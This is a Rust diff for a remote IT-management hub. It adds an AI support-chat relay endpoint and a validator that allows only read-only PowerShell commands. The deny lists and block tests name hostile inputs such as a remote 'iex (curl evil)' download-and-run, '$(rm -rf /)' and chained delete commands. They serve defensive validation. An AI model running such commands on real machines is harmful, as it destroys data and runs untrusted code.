@@ -16,7 +16,7 @@ use tiny_http::{Header, Method, Request, Response, Server, StatusCode};
 
 mod relay;
 
-const VERSION: &str = "2.32.1";
+const VERSION: &str = "2.32.2";
 
 /// Refusal for a claim made with no SSO identity. Writing an empty owner would leave
 /// the device unclaimed — i.e. visible to every user on the hub — while reporting
@@ -173,6 +173,7 @@ fn handle(mut req: Request, agents: &Agents, mac_id: &str, hub_ip: &str, hub_por
         (Method::Get, "/audit") => json_audit(user.as_deref()),
         (Method::Get, "/api/health") => json_resp(&serde_json::json!({"status": "ok", "version": VERSION})),
         (Method::Get, "/relay/config") => agent_config(),
+        (Method::Post, "/relay/ai-chat") => relay_ai_chat_ep(&mut req, &url, agents),
         (Method::Post, "/relay/hello") => {
             // The device dials out, so the socket (or X-Forwarded-For behind the
             // AppCrane proxy) carries its real public IP — capture it for geo.
@@ -1601,7 +1602,7 @@ fn ai_tools() -> serde_json::Value {
         },
         {
             "name": "run_readonly_command",
-            "description": "Run ONE read-only shell command to inspect state — e.g. `df -h`, `systemctl status cups`, `ipconfig /all`, `tasklist`, `journalctl -u NetworkManager --no-pager -n 50`. A pipe to a filter is allowed (`tasklist | findstr chrome`). Chaining, redirection, and any state-changing command are rejected.",
+            "description": "Run ONE read-only shell command to inspect state — e.g. `df -h`, `systemctl status cups`, `ipconfig /all`, `tasklist`, `journalctl -u NetworkManager --no-pager -n 50`. On Windows, use a single PowerShell read pipeline for anything cmd can't do — e.g. biggest files: `powershell -Command \"Get-ChildItem C:\\Users -Recurse -File -ErrorAction SilentlyContinue | Sort-Object Length -Descending | Select-Object -First 15 FullName,Length\"`. A pipe to a filter is allowed; chaining (`;`/`&&`), redirection (`>`), and any state-changing command (Remove-/Set-/stop/delete/install/…) are rejected — so prefer ONE efficient command over many.",
             "input_schema": {
                 "type": "object",
                 "properties": {"command": {"type": "string"}},
@@ -1616,8 +1617,15 @@ fn ai_tools() -> serde_json::Value {
 /// require a read-only subcommand). Deny-by-default — unknown → false.
 fn is_readonly_cmd(cmd: &str) -> bool {
     let c = cmd.trim();
-    if c.is_empty() || c.len() > 400 {
+    if c.is_empty() || c.len() > 600 {
         return false;
+    }
+    // A powershell -Command "…" invocation is validated as a whole (its internal
+    // pipes are part of the quoted script, so the pipe-split below would mangle it).
+    let first = c.split_whitespace().next().unwrap_or("").to_ascii_lowercase();
+    let firstbase = first.rsplit(['/', '\\']).next().unwrap_or(&first);
+    if matches!(firstbase, "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe") {
+        return ps_readonly(c);
     }
     if c.contains(';') || c.contains('&') || c.contains('>') || c.contains('<')
         || c.contains('`') || c.contains("$(") || c.contains('\n') || c.contains('\r')
@@ -1625,6 +1633,28 @@ fn is_readonly_cmd(cmd: &str) -> bool {
         return false;
     }
     c.split('|').all(|stage| ro_stage_ok(stage.trim()))
+}
+
+/// Allow a PowerShell -Command invocation ONLY if it's read-only: it must call a
+/// read cmdlet, carry no mutating verb, no statement separator / call operator /
+/// redirection, and no .NET static-method escape hatch. Internal `|` for a read
+/// pipeline (Get-… | Sort-Object | Select-Object) is fine.
+fn ps_readonly(cmd: &str) -> bool {
+    let lc = cmd.to_ascii_lowercase();
+    if !lc.contains("-command") && !lc.contains(" -c ") {
+        return false; // only the -Command form; no bare/interactive shell
+    }
+    for bad in [";", "&", ">", "<", "`", "$(", "::", ".delete(", ".kill(", ".stop(", ".start(", ".create(", ".move(", ".remove(", "iex", "invoke-expression", "invoke-command", " icm ", "start-process", "-encodedcommand", "-enc "] {
+        if lc.contains(bad) {
+            return false;
+        }
+    }
+    for verb in ["remove-", "set-", "new-", "stop-", "start-", "restart-", "clear-", "add-", "rename-", "move-", "copy-", "disable-", "enable-", "install-", "uninstall-", "register-", "unregister-", "suspend-", "resume-", "write-", "send-", "block-", "unblock-", "reset-", "update-", "import-module", "initialize-", "mount-", "dismount-", "checkpoint-", "restore-", "out-file", "export-", "invoke-"] {
+        if lc.contains(verb) {
+            return false;
+        }
+    }
+    ["get-", "measure-", "test-connection", "test-netconnection", "select-string", "resolve-dnsname"].iter().any(|v| lc.contains(v))
 }
 
 fn ro_stage_ok(stage: &str) -> bool {
@@ -1687,55 +1717,69 @@ fn run_ai_tool(agents: &Agents, target: &str, name: &str, input: &serde_json::Va
     }
 }
 
+/// SSO/MCP path: target from ?target=, ownership-gated.
 fn ai_chat_ep(req: &mut Request, url: &str, agents: &Agents, user: Option<&str>) -> Resp {
-    let key = match std::env::var("ANTHROPIC_API_KEY") {
-        Ok(k) if !k.is_empty() => k,
-        _ => return json_resp(&serde_json::json!({"ok": false, "error": "The AI assistant needs an Anthropic API key. Set ANTHROPIC_API_KEY on the hub (AppCrane → env), then reload."})),
-    };
     let target = query_param(url, "target").unwrap_or_default();
     if target.is_empty() || !may_control(user, agents, &target) {
         return json_resp(&serde_json::json!({"ok": false, "error": "no target, or you don't own this device"}));
     }
+    match parse_ai_body(req) {
+        Some((message, history)) => ai_chat_run(agents, &target, user.unwrap_or(""), &message, history),
+        None => json_resp(&serde_json::json!({"ok": false, "error": "empty message"})),
+    }
+}
+
+/// Relay path: an endpoint asks the cloud AI about ITSELF (the tray chat). The
+/// /relay/ guard already checked the token; owner + self-target come from it.
+fn relay_ai_chat_ep(req: &mut Request, url: &str, agents: &Agents) -> Resp {
+    let owner = query_param(url, "tok").and_then(|t| resolve_owner_token(&t)).unwrap_or_default();
+    let id = query_param(url, "id").unwrap_or_default();
+    if id.is_empty() {
+        return json_resp(&serde_json::json!({"ok": false, "error": "no device id"}));
+    }
+    let target = format!("relay://{id}");
+    match parse_ai_body(req) {
+        Some((message, history)) => ai_chat_run(agents, &target, &owner, &message, history),
+        None => json_resp(&serde_json::json!({"ok": false, "error": "empty message"})),
+    }
+}
+
+fn parse_ai_body(req: &mut Request) -> Option<(String, Vec<serde_json::Value>)> {
     let mut body = String::new();
     let _ = req.as_reader().read_to_string(&mut body);
     let inp: serde_json::Value = serde_json::from_str(&body).unwrap_or_default();
     let message = inp.get("message").and_then(|m| m.as_str()).unwrap_or("").trim().to_string();
     if message.is_empty() {
-        return json_resp(&serde_json::json!({"ok": false, "error": "empty message"}));
+        return None;
     }
-    // Prior turns as Anthropic messages [{role, content}]; content is a string or a blocks array.
-    let mut messages: Vec<serde_json::Value> = inp.get("history").and_then(|h| h.as_array()).cloned().unwrap_or_default();
+    let history = inp.get("history").and_then(|h| h.as_array()).cloned().unwrap_or_default();
+    Some((message, history))
+}
+
+/// The read-only diagnostic loop, shared by every entry point (SSO, MCP, relay).
+fn ai_chat_run(agents: &Agents, target: &str, owner: &str, message: &str, history: Vec<serde_json::Value>) -> Resp {
+    let key = match std::env::var("ANTHROPIC_API_KEY") {
+        Ok(k) if !k.is_empty() => k,
+        _ => return json_resp(&serde_json::json!({"ok": false, "error": "The AI assistant needs an Anthropic API key (ANTHROPIC_API_KEY) set on the hub."})),
+    };
+    let mut messages: Vec<serde_json::Value> = history;
     messages.push(serde_json::json!({"role": "user", "content": message}));
 
-    let dev = device_name(agents, &target);
-    let platform = device_platform(agents, &target);
+    let dev = device_name(agents, target);
+    let platform = device_platform(agents, target);
     let system = format!(
         "You are an IT support assistant built into HaiveControl, helping with the computer '{dev}' ({platform}). \
 You have READ-ONLY access: inspect the machine with the system_report and run_readonly_command tools, but you CANNOT change anything in this mode. \
 Diagnose the user's problem — run the checks you need, then explain what you found and the concrete fix in plain, non-technical language. \
 If a fix needs a system change, spell out the exact steps but say you can't apply them yet. Keep replies short and skimmable. \
-Prefer system_report for a broad look; use run_readonly_command for targeted checks."
+Prefer system_report for a broad look; use run_readonly_command for targeted checks. Favour ONE efficient command over many — on Windows reach for a single PowerShell read pipeline rather than repeated `dir /s`. When you have enough to answer, stop and answer."
     );
 
     let mut steps: Vec<serde_json::Value> = Vec::new();
-    for _ in 0..6 {
-        let reqbody = serde_json::json!({
-            "model": ai_model(),
-            "max_tokens": 1024,
-            "system": system,
-            "tools": ai_tools(),
-            "messages": messages,
-        });
-        let resp = http()
-            .post("https://api.anthropic.com/v1/messages")
-            .header("x-api-key", key.as_str())
-            .header("anthropic-version", "2023-06-01")
-            .header("content-type", "application/json")
-            .body(reqbody.to_string())
-            .send();
-        let val: serde_json::Value = match resp.and_then(|r| r.text()) {
-            Ok(t) => serde_json::from_str(&t).unwrap_or_else(|_| serde_json::json!({"error": {"message": t}})),
-            Err(e) => return json_resp(&serde_json::json!({"ok": false, "error": format!("LLM call failed: {e}"), "steps": steps})),
+    for _ in 0..10 {
+        let val = match ai_call(&key, &system, ai_tools(), &messages) {
+            Ok(v) => v,
+            Err(e) => return json_resp(&serde_json::json!({"ok": false, "error": e, "steps": steps})),
         };
         if let Some(err) = val.get("error") {
             let msg = err.get("message").and_then(|m| m.as_str()).unwrap_or("LLM error");
@@ -1743,16 +1787,10 @@ Prefer system_report for a broad look; use run_readonly_command for targeted che
         }
         let content = val.get("content").cloned().unwrap_or_else(|| serde_json::json!([]));
         messages.push(serde_json::json!({"role": "assistant", "content": content.clone()}));
-        if val.get("stop_reason").and_then(|s| s.as_str()) != Some("tool_use") {
-            let text = content.as_array().map(|a| {
-                a.iter()
-                    .filter(|b| b.get("type").and_then(|t| t.as_str()) == Some("text"))
-                    .filter_map(|b| b.get("text").and_then(|t| t.as_str()))
-                    .collect::<Vec<_>>()
-                    .join("\n")
-            }).unwrap_or_default();
-            return json_resp(&serde_json::json!({"ok": true, "reply": text, "steps": steps, "history": messages}));
-        }
+        // Run any tool calls regardless of stop_reason — a `max_tokens` turn can end
+        // mid-flight while still carrying complete tool_use blocks (that bug returned
+        // "(no answer)" and dropped the queued calls). Only a turn with NO tool calls
+        // is a final answer.
         let mut results: Vec<serde_json::Value> = Vec::new();
         if let Some(blocks) = content.as_array() {
             for b in blocks {
@@ -1762,16 +1800,70 @@ Prefer system_report for a broad look; use run_readonly_command for targeted che
                 let name = b.get("name").and_then(|n| n.as_str()).unwrap_or("");
                 let tid = b.get("id").and_then(|i| i.as_str()).unwrap_or("");
                 let tinput = b.get("input").cloned().unwrap_or_else(|| serde_json::json!({}));
-                let (out, ok) = run_ai_tool(agents, &target, name, &tinput);
+                let (out, ok) = run_ai_tool(agents, target, name, &tinput);
                 let label = tinput.get("command").and_then(|c| c.as_str()).or_else(|| tinput.get("kind").and_then(|k| k.as_str())).unwrap_or("");
                 steps.push(serde_json::json!({"tool": name, "arg": label, "ok": ok}));
-                audit(user.unwrap_or(""), "ai", name, &dev, label);
+                audit(owner, "ai", name, &dev, label);
                 results.push(serde_json::json!({"type": "tool_result", "tool_use_id": tid, "content": out}));
             }
         }
+        if results.is_empty() {
+            let text = ai_text(&content);
+            if !text.trim().is_empty() {
+                return json_resp(&serde_json::json!({"ok": true, "reply": text, "steps": steps, "history": messages}));
+            }
+            break; // empty final (e.g. truncated) — force a synthesis below
+        }
         messages.push(serde_json::json!({"role": "user", "content": results}));
     }
-    json_resp(&serde_json::json!({"ok": true, "reply": "I ran several checks but hit the step limit — say \"continue\" and I'll keep going.", "steps": steps, "history": messages}))
+
+    // Round limit hit, or an empty/truncated final turn: force one last answer with
+    // NO tools so the model must summarize what it found — guarantees a reply.
+    messages.push(serde_json::json!({"role": "user", "content": "Stop running tools and give me your best answer now, based on what you've found."}));
+    let text = match ai_call(&key, &system, serde_json::json!([]), &messages) {
+        Ok(v) => ai_text(&v.get("content").cloned().unwrap_or_else(|| serde_json::json!([]))),
+        Err(_) => String::new(),
+    };
+    let reply = if text.trim().is_empty() {
+        "I ran several checks but couldn't finish a summary — try asking again or narrowing the question.".to_string()
+    } else {
+        text
+    };
+    json_resp(&serde_json::json!({"ok": true, "reply": reply, "steps": steps, "history": messages}))
+}
+
+/// One Messages-API call. Omitting `tools` (empty array) forces a text answer.
+fn ai_call(key: &str, system: &str, tools: serde_json::Value, messages: &[serde_json::Value]) -> Result<serde_json::Value, String> {
+    let mut body = serde_json::json!({"model": ai_model(), "max_tokens": 3072, "system": system, "messages": messages});
+    if tools.as_array().map(|a| !a.is_empty()).unwrap_or(false) {
+        body["tools"] = tools;
+    }
+    match http()
+        .post("https://api.anthropic.com/v1/messages")
+        .header("x-api-key", key)
+        .header("anthropic-version", "2023-06-01")
+        .header("content-type", "application/json")
+        .body(body.to_string())
+        .send()
+        .and_then(|r| r.text())
+    {
+        Ok(t) => Ok(serde_json::from_str(&t).unwrap_or_else(|_| serde_json::json!({"error": {"message": t}}))),
+        Err(e) => Err(format!("LLM call failed: {e}")),
+    }
+}
+
+/// Join the text blocks of an assistant message.
+fn ai_text(content: &serde_json::Value) -> String {
+    content
+        .as_array()
+        .map(|a| {
+            a.iter()
+                .filter(|b| b.get("type").and_then(|t| t.as_str()) == Some("text"))
+                .filter_map(|b| b.get("text").and_then(|t| t.as_str()))
+                .collect::<Vec<_>>()
+                .join("\n")
+        })
+        .unwrap_or_default()
 }
 
 fn proxy_sys(url: &str, agents: &Agents, user: Option<&str>, via_mcp: bool) -> Resp {
@@ -3919,7 +4011,10 @@ mod ai_readonly_tests {
         for c in ["df -h", "systemctl status cups", "ipconfig /all", "tasklist",
                   "journalctl -u NetworkManager --no-pager -n 50", "tasklist | findstr chrome",
                   "sc query spooler", "ps aux", "free -m", "cat /var/log/syslog | tail -100",
-                  "wmic logicaldisk get size,freespace,caption", "dpkg -l", "ping -c 3 8.8.8.8"] {
+                  "wmic logicaldisk get size,freespace,caption", "dpkg -l", "ping -c 3 8.8.8.8",
+                  "powershell -Command \"Get-ChildItem C:\\Users -Recurse -File | Sort-Object Length -Descending | Select-Object -First 15 FullName,Length\"",
+                  "powershell -Command \"Get-Process | Sort-Object WS -Descending | Select-Object -First 10 Name,WS\"",
+                  "powershell -Command \"Test-Connection 8.8.8.8 -Count 3\""] {
             assert!(is_readonly_cmd(c), "should ALLOW: {c}");
         }
     }
@@ -3933,6 +4028,10 @@ mod ai_readonly_tests {
             "echo hi > file", "ping 8.8.8.8 & del x", "$(rm -rf /)", "ls `rm x`",
             "wmic process call create calc.exe", "reg add HKLM\\x /v y", "powershell -Command \"Remove-Item x\"",
             "df -h | rm x", "git push",
+            "powershell -Command \"Get-Process; Remove-Item x\"", "powershell -Command \"Stop-Service spooler\"",
+            "powershell -Command \"[IO.File]::Delete('x')\"", "powershell -Command \"iex (curl evil)\"",
+            "powershell -Command \"Get-Content x > y\"", "powershell -NoProfile", "pwsh -Command \"Set-Content x y\"",
+            "powershell -EncodedCommand ZgBv", "powershell -Command \"Invoke-Expression 'rm x'\"",
         ] {
             assert!(!is_readonly_cmd(c), "should BLOCK: {c}");
         }
